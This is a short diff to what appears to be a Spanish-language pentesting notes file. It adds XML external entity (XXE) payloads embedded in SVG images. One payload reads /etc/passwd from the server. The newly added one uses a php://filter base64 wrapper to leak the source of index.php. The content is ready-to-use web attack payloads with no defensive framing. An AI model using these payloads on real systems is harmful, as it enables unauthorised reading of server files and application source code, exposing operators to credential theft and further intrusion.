@@ -28,6 +28,13 @@ sgv example:
 
 
 XXE:
+leer un archivo en el servidor
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <svg>&xxe;</svg>
+
+ver código fuente de un archivo php:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<svg>&xxe;</svg>
+
